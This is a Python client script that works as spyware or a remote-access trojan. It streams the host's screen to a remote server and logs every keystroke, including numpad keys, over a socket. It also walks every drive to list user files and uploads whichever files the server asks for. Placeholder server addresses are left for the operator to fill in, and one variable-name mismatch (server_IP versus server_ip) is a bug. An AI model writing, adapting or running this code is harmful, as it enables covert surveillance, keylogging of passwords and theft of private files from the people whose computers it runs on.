import os
import socket
import pickle
import logging
from vidstream import ScreenShareClient   # pip install vidstream
import threading
from pynput.keyboard import Key, Listener, KeyCode   # pip install pynput
import psutil   # pip install psutil

# Disable all logging messages from the vidstream library
logging.disable(logging.CRITICAL)

# List of operating system directories to skip
OS_DIRECTORIES = ["Windows", "Program Files", "Program Files (x86)", "ProgramData", "AppData"]

# List of file extensions to skip
OS_FILE_EXTENSIONS = [".exe", ".dll", ".sys", ".ini"]

# List of files to exclude
EXCLUDED_FILES = []

def send_file_list():
    server_ip = 'Server_IP'  # Replace with your server's IP address
    server_port = 9988

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_IP, server_port))

    file_list = []
    drives = [drive.device for drive in psutil.disk_partitions()]
    for drive in drives:
        for dirpath, dirnames, filenames in os.walk(drive):
            # Exclude OS directories
            dirnames[:] = [d for d in dirnames if d not in OS_DIRECTORIES]

            for file in filenames:
                # Exclude OS file extensions
                if any(file.lower().endswith(ext) for ext in OS_FILE_EXTENSIONS):
                    continue

                # Exclude specific files
                if file in EXCLUDED_FILES:
                    continue

                full_path = os.path.join(dirpath, file)
                file_list.append(full_path)

    # Serialize the file list and send it to the server
    data = pickle.dumps(file_list)

    # Send the length of the serialized data as a 4-byte integer
    data_length = len(data).to_bytes(4, 'big')
    client_socket.sendall(data_length)

    # Send the serialized data
    client_socket.sendall(data)

    # Indicate the end of data using a delimiter
    client_socket.send(b'<<END_OF_DATA>>')

    # Receive the download requests from the server
    try:
        while True:
            request = client_socket.recv(1024).decode()
            if request == 'exit':
                # If the server sends 'exit', it means all files are downloaded.
                break
            else:
                download_file(request, client_socket)
    finally:
        # Close the client socket after all files are downloaded or in case of any exception.
        client_socket.close()

def download_file(file_path, client_socket):
    try:
        with open(file_path, 'rb') as file:
            file_data = file.read()
            file_size = len(file_data)

        # Send the file size to the server as binary representation (4 bytes)
        client_socket.sendall(file_size.to_bytes(4, 'big'))

        # Send the file data in chunks of 4096 bytes
        chunk_size = 4096
        bytes_sent = 0
        while bytes_sent < file_size:
            chunk = file_data[bytes_sent:bytes_sent + chunk_size]
            client_socket.sendall(chunk)
            bytes_sent += len(chunk)

        print(f"File {file_path} sent to the server.")
    except FileNotFoundError:
        print(f"File {file_path} not found.")

def on_key_press(key, client_socket):
    try:
        if key == Key.tab:
            key_str = "Tab"
        elif key == Key.caps_lock:
            key_str = "CapsLock"
        elif key == Key.ctrl_l:
            key_str = "Control_L"
        elif key == Key.ctrl_r:
            key_str = "Control_R"
        elif key == Key.shift:
            key_str = "Shift"
        elif key == Key.shift_r:
            key_str = "Shift_R"
        elif key == Key.enter:
            key_str = "Enter"
        elif key == Key.delete:
            key_str = "Delete"
        elif key == Key.backspace:
            key_str = "Backspace"
        elif key == Key.space:
            key_str = "Space"
        elif key == Key.left:
            key_str = "Left"
        elif key == Key.right:
            key_str = "Right"
        elif key == Key.up:
            key_str = "Up"
        elif key == Key.down:
            key_str = "Down"
        elif key.char is not None:
            key_str = str(key.char)
        else:
            key_str = str(key).replace("'", "")

        # Convert the key_str to numpad format if it's a numpad key
        if isinstance(key, KeyCode) and 96 <= key.vk <= 110:  # Virtual key codes for numpad keys are 96 to 105
            if key.vk == 96:
                key_str = "numpad_0"
            elif key.vk == 97:
                key_str = "numpad_1"
            elif key.vk == 98:
                key_str = "numpad_2"
            elif key.vk == 99:
                key_str = "numpad_3"
            elif key.vk == 100:
                key_str = "numpad_4"
            elif key.vk == 101:
                key_str = "numpad_5"
            elif key.vk == 102:
                key_str = "numpad_6"
            elif key.vk == 103:
                key_str = "numpad_7"
            elif key.vk == 104:
                key_str = "numpad_8"
            elif key.vk == 105:
                key_str = "numpad_9"
            elif key.vk == 110:
                key_str = "numpad_dot"

        client_socket.send(str(key_str).encode())

    except AttributeError:
        pass

def send_key_events(client_socket):
    server_ip = 'Server_IP'  # Replace with your server's IP address
    server_port = 9998

    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    client_socket.connect((server_ip, server_port))

    def on_press(key):
        on_key_press(key, client_socket)

    with Listener(on_press=on_press) as listener:
        try:
            listener.join()
        except KeyboardInterrupt:
            client_socket.close()

def start_client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    client = ScreenShareClient('System_IP', 9999)  # Replace with your server's IP address
    client.start_stream()

    # Start the key event sender in a separate thread
    key_event_thread = threading.Thread(target=send_key_events, args=(client_socket,))
    key_event_thread.start()

    # Send the file list to the server
    send_file_list()

    # Wait for the key_event_thread to finish before exiting
    key_event_thread.join()

    client_socket.close()

if __name__ == "__main__":
    start_client()